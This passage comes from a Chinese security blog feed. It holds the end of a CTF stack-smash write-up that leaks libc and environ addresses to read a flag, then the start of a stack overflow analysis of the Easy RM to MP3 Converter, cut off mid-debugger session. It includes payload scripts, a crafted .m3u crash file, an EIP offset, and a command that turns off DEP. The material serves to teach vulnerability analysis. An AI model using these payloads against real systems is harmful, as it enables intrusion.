<p>泄露出 libc 基址为 0x7ffff7a0d000。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received <span class="number">0x7a</span> bytes:</div><div class="line">    <span class="number">00000000</span>  <span class="number">59</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">20</span>  <span class="number">73</span> <span class="number">68</span> <span class="number">6</span>f <span class="number">75</span>  <span class="number">6</span>c <span class="number">64</span> <span class="number">20</span> <span class="number">74</span>  <span class="number">61</span> <span class="number">6</span>b <span class="number">65</span> <span class="number">20</span>  │You │shou│ld t│ake │</div><div class="line">    <span class="number">00000010</span>  <span class="number">6</span>d <span class="number">6</span>f <span class="number">72</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">65</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">6</span>f <span class="number">72</span> <span class="number">74</span> <span class="number">20</span>  <span class="number">74</span> <span class="number">6</span>f <span class="number">20</span> <span class="number">67</span>  │more│ eff│ort │to g│</div><div class="line">    <span class="number">00000020</span>  <span class="number">65</span> <span class="number">74</span> <span class="number">20</span> <span class="number">73</span>  <span class="number">69</span> <span class="number">78</span> <span class="number">20</span> <span class="number">73</span>  <span class="number">65</span> <span class="number">6</span>e <span class="number">63</span> <span class="number">65</span>  <span class="number">2</span>c <span class="number">20</span> <span class="number">61</span> <span class="number">6</span>e  │et s│ix s│ence│, an│</div><div class="line">    <span class="number">00000030</span>  <span class="number">64</span> <span class="number">20</span> <span class="number">6</span>f <span class="number">6</span>e  <span class="number">65</span> <span class="number">20</span> <span class="number">6</span>d <span class="number">6</span>f  <span class="number">72</span> <span class="number">65</span> <span class="number">20</span> <span class="number">63</span>  <span class="number">68</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">6</span>c  │d on│e mo│re c│hall│</div><div class="line">    <span class="number">00000040</span>  <span class="number">65</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">21</span> <span class="number">21</span> <span class="number">0</span>a <span class="number">2</span>a  <span class="number">2</span>a <span class="number">2</span>a <span class="number">20</span> <span class="number">73</span>  <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6</span>b  │enge│!!·*│** s│tack│</div><div class="line">    <span class="number">00000050</span>  <span class="number">20</span> <span class="number">73</span> <span class="number">6</span>d <span class="number">61</span>  <span class="number">73</span> <span class="number">68</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">67</span> <span class="number">20</span> <span class="number">64</span> <span class="number">65</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">63</span> <span class="number">74</span>  │ sma│shin│g de│tect│</div><div class="line">    <span class="number">00000060</span>  <span class="number">65</span> <span class="number">64</span> <span class="number">20</span> <span class="number">2</span>a  <span class="number">2</span>a <span class="number">2</span>a <span class="number">3</span>a <span class="number">20</span>  <span class="number">40</span> d7 a2 f7  ff <span class="number">7</span>f <span class="number">20</span> <span class="number">74</span>  │ed *│**: │@···│·· t│</div><div class="line">    <span class="number">00000070</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">74</span> <span class="number">65</span>  <span class="number">64</span> <span class="number">0</span>a                     │ermi│nate│d·│</div><div class="line">    <span class="number">0000007</span>a</div><div class="line">libc_base_addr = <span class="number">0x7ffff7a0d000</span></div></pre></td></tr></table></figure></p>
<h3 id="2）泄露-environ"><a href="#2）泄露-environ" class="headerlink" title="2）泄露 environ"></a>2）泄露 environ</h3><p>构造以下 payload，第二次利用栈溢出将 argv[0] 覆盖为 <code>environ</code> 的地址，从而泄露出 <code>environ</code> 的值，该值为执行环境变量的栈地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">environ_addr = libc_base_addr + libc.symbols[<span class="string">'_environ'</span>]</div><div class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(environ_addr)</div></pre></td></tr></table></figure></p>
<p>泄露出 <code>environ</code> 的值为 0x7fffffffdcf8。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received <span class="number">0x7a</span> bytes:</div><div class="line">    <span class="number">00000000</span>  <span class="number">59</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">20</span>  <span class="number">73</span> <span class="number">68</span> <span class="number">6</span>f <span class="number">75</span>  <span class="number">6</span>c <span class="number">64</span> <span class="number">20</span> <span class="number">74</span>  <span class="number">61</span> <span class="number">6</span>b <span class="number">65</span> <span class="number">20</span>  │You │shou│ld t│ake │</div><div class="line">    <span class="number">00000010</span>  <span class="number">6</span>d <span class="number">6</span>f <span class="number">72</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">65</span> <span class="number">66</span> <span class="number">66</span>  <span class="number">6</span>f <span class="number">72</span> <span class="number">74</span> <span class="number">20</span>  <span class="number">74</span> <span class="number">6</span>f <span class="number">20</span> <span class="number">67</span>  │more│ eff│ort │to g│</div><div class="line">    <span class="number">00000020</span>  <span class="number">65</span> <span class="number">74</span> <span class="number">20</span> <span class="number">73</span>  <span class="number">69</span> <span class="number">78</span> <span class="number">20</span> <span class="number">73</span>  <span class="number">65</span> <span class="number">6</span>e <span class="number">63</span> <span class="number">65</span>  <span class="number">2</span>c <span class="number">20</span> <span class="number">61</span> <span class="number">6</span>e  │et s│ix s│ence│, an│</div><div class="line">    <span class="number">00000030</span>  <span class="number">64</span> <span class="number">20</span> <span class="number">6</span>f <span class="number">6</span>e  <span class="number">65</span> <span class="number">20</span> <span class="number">6</span>d <span class="number">6</span>f  <span class="number">72</span> <span class="number">65</span> <span class="number">20</span> <span class="number">63</span>  <span class="number">68</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">6</span>c  │d on│e mo│re c│hall│</div><div class="line">    <span class="number">00000040</span>  <span class="number">65</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">21</span> <span class="number">21</span> <span class="number">0</span>a <span class="number">2</span>a  <span class="number">2</span>a <span class="number">2</span>a <span class="number">20</span> <span class="number">73</span>  <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6</span>b  │enge│!!·*│** s│tack│</div><div class="line">    <span class="number">00000050</span>  <span class="number">20</span> <span class="number">73</span> <span class="number">6</span>d <span class="number">61</span>  <span class="number">73</span> <span class="number">68</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">67</span> <span class="number">20</span> <span class="number">64</span> <span class="number">65</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">63</span> <span class="number">74</span>  │ sma│shin│g de│tect│</div><div class="line">    <span class="number">00000060</span>  <span class="number">65</span> <span class="number">64</span> <span class="number">20</span> <span class="number">2</span>a  <span class="number">2</span>a <span class="number">2</span>a <span class="number">3</span>a <span class="number">20</span>  f8 dc ff ff  ff <span class="number">7</span>f <span class="number">20</span> <span class="number">74</span>  │ed *│**: │····│·· t│</div><div class="line">    <span class="number">00000070</span>  <span class="number">65</span> <span class="number">72</span> <span class="number">6</span>d <span class="number">69</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">74</span> <span class="number">65</span>  <span class="number">64</span> <span class="number">0</span>a                     │ermi│nate│d·│</div><div class="line">    <span class="number">0000007</span>a</div><div class="line">stack_addr = <span class="number">0x7fffffffdcf8</span></div></pre></td></tr></table></figure></p>
<p>可在 gdb 中验证该值为正确的。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ print environ</div><div class="line">$1 = (char **) 0x7fffffffdcf8</div><div class="line">gdb-peda$ telescope 0x7fffffffdcf8</div><div class="line">0000| 0x7fffffffdcf8 --&gt; 0x7fffffffe0ea ("INSTANCE=")</div><div class="line">0008| 0x7fffffffdd00 --&gt; 0x7fffffffe0f4 ("MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path")</div><div class="line">0016| 0x7fffffffdd08 --&gt; 0x7fffffffe12a ("ALL_PROXY=socks://192.168.239.1:1080/")</div><div class="line">       ...</div></pre></td></tr></table></figure></p>
<h3 id="3）读取-flag"><a href="#3）读取-flag" class="headerlink" title="3）读取 flag"></a>3）读取 flag</h3><p>查看内存中 flag 的地址为 0x7fffffffdb90，计算该地址与泄露栈地址的偏移量为 0x168（0x7fffffffdcf8 - 0x7fffffffdb90）。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ stack 20                                                                                                                                             </div><div class="line">0000| 0x7fffffffdb08 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:  cmp    rax,0x0)</div><div class="line">0008| 0x7fffffffdb10 --&gt; 0x7ffff7dd3780 --&gt; 0x0 </div><div class="line">     ...</div><div class="line">0088| 0x7fffffffdb60 --&gt; 0x7fffffffdce8 --&gt; 0x7fffffffe0e2 --&gt; 0x73736575672f2e ('./guess')</div><div class="line">0096| 0x7fffffffdb68 --&gt; 0x100000000 </div><div class="line">0104| 0x7fffffffdb70 --&gt; 0x8600000000 </div><div class="line">0112| 0x7fffffffdb78 --&gt; 0x3 </div><div class="line">0120| 0x7fffffffdb80 --&gt; 0x2 </div><div class="line">0128| 0x7fffffffdb88 --&gt; 0x3 </div><div class="line">0136| 0x7fffffffdb90 ("flag&#123;43861991f7e943090e257863eec75961&#125;\n")</div><div class="line">     ...</div></pre></td></tr></table></figure></p>
<p>构造以下 payload，第三次利用栈溢出覆盖 argv[0] 为 flag 的内存地址，从而可读取内存中的 flag。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</div></pre></td></tr></table></figure></p>
<p>最终获取 flag 如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[DEBUG] Received <span class="number">0x9b</span> bytes:</div><div class="line">    <span class="string">'You should take more effort to get six sence, and one more challenge!!\n'</span></div><div class="line">    <span class="string">'*** stack smashing detected ***: flag&#123;43861991f7e943090e257863eec75961&#125;\n'</span></div><div class="line">    <span class="string">' terminated\n'</span></div><div class="line">You should take more effort to get six sence, <span class="keyword">and</span> one more challenge!!</div><div class="line">*** stack smashing detected ***: flag&#123;<span class="number">43861991</span>f7e943090e257863eec75961&#125;</div><div class="line"> terminated</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="external">浅析ROP之Stack Smash</a><br>[2] <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="external">Environ</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Stack smash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[EasyRM2MP3 栈溢出分析]]></title>
      <url>/2018/0814/easyrm2mp3-stack-overflow-analysis/</url>
      <content type="html"><![CDATA[<h1 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h1><p>Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的<a href="https://www.exploit-db.com/exploits/9186/" target="_blank" rel="external">信息</a>可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。</p>
<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>调试环境如下：</p>
<blockquote>
<p>操作系统：Windows7 SP1 64 bits<br>调试器：Windbg 10.0.10586</p>
</blockquote>
<p>由于 Windows7 系统默认开启 DEP 保护，利用该漏洞时，为了返回到栈上执行 shellcode，需要把系统 DEP 关闭。<br>（1）“命令运行符” -&gt; “以管理员身份运行”；<br>（2）运行 bcdedit.exe/set {current} nx AlwaysOff；<br>（3）重启计算机生效。</p>
<h2 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1. 漏洞复现"></a>1. 漏洞复现</h2><p>首先使用以下脚本生成一个 .m3u 文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = <span class="number">30000</span> * <span class="string">"A"</span></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
<p>WinDbg 中直接运行程序，加载 crash.m3u 文件后将会触发栈溢出，此时 eip 寄存器值为 0x41414141。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(ddc.10b0): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000001 ebx=00164a1c ecx=7701387a edx=00580600 esi=76942960 edi=00007530</div><div class="line">eip=41414141 esp=0015f614 ebp=006031c8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</div><div class="line">41414141 ??              ???</div></pre></td></tr></table></figure></p>
<p>使用 mona.py 插件可计算出覆盖 eip 所需要填充的字符数量为 26094，从而精确控制 eip 指向的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">offset = <span class="number">26094</span></div><div class="line">payload = offset*<span class="string">"A"</span> + <span class="string">"B"</span>*<span class="number">4</span></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
<p>再次运行程序并加载 crash.m3u 文件，可看到 eip 执行 0x42424242。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(da0.ae0): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000001 ebx=00164a1c ecx=7701387a edx=00590600 esi=76942960 edi=000065f2</div><div class="line">eip=42424242 esp=0015f614 ebp=005b31c8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</div><div class="line">42424242 ??              ???</div></pre></td></tr></table></figure></p>
<h2 id="2-漏洞定位"><a href="#2-漏洞定位" class="headerlink" title="2. 漏洞定位"></a>2. 漏洞定位</h2><p>由于程序崩溃时，查看调用栈不能得到有效的信息，无法通过栈回溯的方法定位到漏洞位置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</div><div class="line"> <span class="comment"># ChildEBP RetAddr  Args to Child</span></div><div class="line">WARNING: Frame IP <span class="keyword">not</span> <span class="keyword">in</span> any known module. Following frames may be wrong.</div><div class="line"><span class="number">00</span> <span class="number">0015</span>f610 <span class="number">00000000</span> <span class="number">00000006</span> <span class="number">00164</span>a1c <span class="number">00000001</span> <span class="number">0x42424242</span></div></pre></td></tr></table></figure></p>
<p>因为该程序未开启 ASLR，所以每次运行时栈中缓冲区的地址都相同。此外，栈溢出漏洞触发时必须要往缓冲区写数据，因此，在缓冲区起始地址处设置内存写断点，即可找到漏洞位置。</p>
<p>首先需要计算出缓冲区起始地址，程序崩溃时，esp-8 的位置为覆盖返回地址的数据。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; d esp<span class="number">-8</span></div><div class="line"><span class="number">0015</span>f60c  <span class="number">42424242</span> <span class="number">005</span>b3100 <span class="number">00000000</span> <span class="number">00000006</span></div><div class="line"><span class="number">0015</span>f61c  <span class="number">00164</span>a1c <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">005</span>c0000</div><div class="line"><span class="number">0015</span>f62c  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015</span>f63c  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div></pre></td></tr></table></figure></p>
<p>根据前面计算出的偏移量，可倒推出缓冲区起始地址为 0x‭15901E‬（0x0015f60c-26094）。重新运行程序，使用以下命令设置断点后继续运行，载入文件之前触发的断点无需关注。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ba w <span class="number">1</span> <span class="number">0x15901e</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> e <span class="number">0015901</span>e w <span class="number">1</span> <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** </div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div></pre></td></tr></table></figure></p>
<p>载入 crash.m3u 文件后继续运行，可触发 2 次断点。第二次断下的位置为 MSRMfilter03!Playlist_FindNextItem+0x53 （0x10008d93），该指令进行数据拷贝操作，即为漏洞触发点。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">0000087</span>b edx=<span class="number">06317540</span> esi=<span class="number">76942960</span> edi=<span class="number">00159020</span></div><div class="line">eip=<span class="number">0041e318</span> esp=<span class="number">00156</span>ce4 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">image00400000+<span class="number">0x1e318</span>:</div><div class="line"><span class="number">0041e318</span> f3ab            rep stos dword ptr es:[edi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">0000197</span>c edx=<span class="number">00006605</span> esi=<span class="number">06</span>ed14a4 edi=<span class="number">00159020</span></div><div class="line">eip=<span class="number">10008</span>d93 esp=<span class="number">00156</span>cc8 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x53</span>:</div><div class="line"><span class="number">10008</span>d93 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd <span class="number">0x15901e</span></div><div class="line"><span class="number">0015901</span>e  <span class="number">00004141</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line"><span class="number">0015902</span>e  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line"><span class="number">0015903</span>e  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div></pre></td></tr></table></figure></p>
<p>此时查看调用栈如下，MSRMfilter03!Playlist_FindNextItem 在 image00400000 中调用，且返回地址为 0041e3f6。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</div><div class="line"> <span class="comment"># ChildEBP RetAddr  Args to Child</span></div><div class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</div><div class="line"><span class="number">00</span> <span class="number">00156</span>cd8 <span class="number">0041e3</span>f6 <span class="number">0015900</span>c <span class="number">000065</span>f2 <span class="number">76942960</span> MSRMfilter03!Playlist_FindNextItem+<span class="number">0x53</span></div><div class="line"><span class="number">01</span> <span class="number">00156</span>cdc <span class="number">0015900</span>c <span class="number">000065</span>f2 <span class="number">76942960</span> <span class="number">002731</span>c8 image00400000+<span class="number">0x1e3f6</span></div><div class="line"><span class="number">02</span> <span class="number">00156</span>ce0 <span class="number">00000000</span> <span class="number">76942960</span> <span class="number">002731</span>c8 <span class="number">00164</span>a1c <span class="number">0x15900c</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00006605</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">000010</span>b9 edx=<span class="number">00156</span>d04 esi=<span class="number">0015</span>b32c edi=<span class="number">00159024</span></div><div class="line">eip=<span class="number">0041e553</span> esp=<span class="number">00156</span>ce4 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">image00400000+<span class="number">0x1e553</span>:</div><div class="line"><span class="number">0041e553</span> f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd <span class="number">0x15901e</span></div><div class="line"><span class="number">0015901</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015902</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015903</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015904</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div></pre></td></tr></table></figure></p>
<h2 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3. 漏洞成因"></a>3. 漏洞成因</h2><p>使用 IDA 加载 MSRMfilter03.dll，跟进到 0x10008d93 分析可知，Playlist_FindNextItem() 函数中使用 strcpy 将 v1 复制给 a1 时未进行长度检查，当复制过长数据到 a1 时会导致栈溢出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">Playlist_FindNextItem</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line"></div><div class="line">  sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF, aDMpf20Mplayerm, <span class="number">192</span>);</div><div class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_10006850((<span class="keyword">int</span>)dword_1004D600, <span class="number">1</span>);</div><div class="line">  <span class="keyword">if</span> ( v1 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">strcpy</span>(a1, v1);    <span class="comment">// overflow!!!</span></div><div class="line">    sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF_0, aDMpf20Mplayerm, <span class="number">205</span>);</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF_1, aDMpf20Mplayerm, <span class="number">201</span>);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接下来分析 strcpy 的两个参数，源字符串 v1 为 sub_10006850 函数的返回值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u <span class="number">10008</span>D5E</div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>:</div><div class="line"><span class="number">10008</span>d5e e8eddaffff      call    MSRMfilter03+<span class="number">0x6850</span> (<span class="number">10006850</span>)</div><div class="line"><span class="number">10008</span>d63 <span class="number">83</span>c418          add     esp,<span class="number">18</span>h</div><div class="line"><span class="number">10008</span>d66 <span class="number">85</span>c0            test    eax,eax</div><div class="line"><span class="number">10008</span>d68 <span class="number">7444</span>            je      MSRMfilter03!Playlist_FindNextItem+<span class="number">0x6e</span> (<span class="number">10008</span>dae)</div><div class="line"><span class="number">10008</span>d6a <span class="number">56</span>              push    esi</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu <span class="number">10008</span>d5e</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> e <span class="number">10008</span>d5e     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span></div></pre></td></tr></table></figure></p>
<p>因此在调用该函数的位置下断点，程序断下时查看其返回值为文件路径加上输入的数据。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>)</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">02900600</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">7701387</span>a edx=<span class="number">02900700</span> esi=<span class="number">005</span>f31e4 edi=<span class="number">0015</span>f60c</div><div class="line">eip=<span class="number">10008</span>d5e esp=<span class="number">00156</span>cc4 ebp=<span class="number">005</span>f31c8 iopl=<span class="number">0</span>         nv up ei pl nz na po nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000202</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>:</div><div class="line"><span class="number">10008</span>d5e 